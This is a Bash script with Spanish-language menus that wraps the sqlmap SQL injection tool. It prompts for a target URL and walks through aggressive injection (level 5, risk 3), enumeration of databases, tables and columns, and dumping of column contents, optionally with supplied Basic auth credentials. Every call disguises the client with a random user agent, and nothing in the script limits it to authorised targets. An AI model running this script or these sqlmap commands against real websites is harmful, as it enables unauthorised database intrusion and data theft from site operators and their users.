#!/bin/bash

echo ""
echo "SQLMAP_MODIFIED"
echo ""


opcion="ninguna"

# Opcion0 ################################################################
function opcion0
{

echo ""
echo -e "\e[33m Ingrese la URL para ver las bases de datos\e[0m"
echo ""
read url

sqlmap -u "$url" --level=5 --risk=3 --dbs --random-agent

   read
   return 0

}

# Opcion1 ################################################################
function opcion1
{

echo ""
echo -e "\e[33m Ingrese la URL para ver las bases de datos y tablas\e[0m"
echo ""
read url

sqlmap -u "$url" --tables --random-agent

   read
   return 0

}

# Opcion2 ################################################################
function opcion2
{

echo ""
echo -e "\e[33m Ingrese la URL \e[0m"
echo ""
read url

echo ""
echo -e "\e[33m Ingrese el nombre de la base de datos  \e[0m"
echo ""
read tabla

sqlmap -u "$url" -D $tabla --tables --random-agent

   read
   return 0

}

# Opcion3 ################################################################
function opcion3
{

echo ""
echo -e "\e[33m Ingrese la URL \e[0m"
echo ""
read url

echo ""
echo -e "\e[33m Ingrese el nombre de la base de datos  \e[0m"
echo ""
read tabla

echo ""
echo -e "\e[33m Ingrese el nombre de la tabla  \e[0m"
echo ""
read columns

sqlmap -u "$url" -D $tabla -T $columns --columns --random-agent

   read
   return 0

}

# Opcion4 ################################################################
function opcion4
{

echo ""
echo -e "\e[33m Ingrese la URL \e[0m"
echo ""
read url

echo ""
echo -e "\e[33m Ingrese el nombre de la base de datos  \e[0m"
echo ""
read tabla

echo ""
echo -e "\e[33m Ingrese el nombre de la tabla  \e[0m"
echo ""
read columns

echo ""
echo -e "\e[33m  Ingrese el nombre de la columna  \e[0m"
echo ""
read detalle_column

sqlmap -u "$url" -D $tabla -T $columns -C $detalle_column --dump --random-agent

   read
   return 0

}

# Opcion5 ################################################################
function opcion5
{

echo ""
echo -e "\e[33m Ingrese la URL para ver las bases de datos\e[0m"
echo ""
read url

echo ""
echo -e "\e[33m Ingrese el usuario \e[0m"
echo ""
read user

echo ""
echo -e "\e[33m Ingrese el password \e[0m"
echo ""
read passwd

sqlmap -u "$url" --level=5 --risk=3 --dbs --random-agent --auth-type="Basic" --auth-cred="$user:$passwd"

   read
   return 0

}


while [ $opcion != "6"  ]
    do

echo ""

	echo -e "+-------------------------------------------------------------------------------+"
	echo -e "\e[31m	-- MENU -- \e[0m					      			|"
	echo "|										|"
        echo -e "|\t0) Ingrese la URL para ver las bases de datos			        |"
	echo -e "|\t1) Ingrese la URL para ver las bases de datos y tablas		        |"
	echo -e "|\t2) Ingrese la URL y el nombre de la base de datos para listar las tablas|"
	echo -e "|\t3) Ver info de la tabla						        |"
	echo -e "|\t4) Ver detalle de la columna - de la tabla anterior			|"
	echo -e "|\t5) Ingrese la URL para ver las bases de datos (Requiere credenciales)   |"
	echo -e "|\t6) Salir								|"
	echo -e "+-------------------------------------------------------------------------------+"
	echo -e "\e[33m \tOpcion: \c \e[0m"

read opcion

echo -e "\e[33m -------------------------------------------------------------  \e[0m"

        if [ -z $opcion ] ; then opcion="ninguna" ; fi

        case $opcion in
		"0" )
                      opcion0
  		      ;;
		"1" )
                      opcion1
  		      ;;
		"2" )
		      opcion2
		      ;;
                "3" )
                      opcion3
                      ;;
		"4" )
                      opcion4
                      ;;
                "5" )
                      opcion5
                      ;;
		"*" )
		      ;;

	esac


	/usr/bin/clear
done
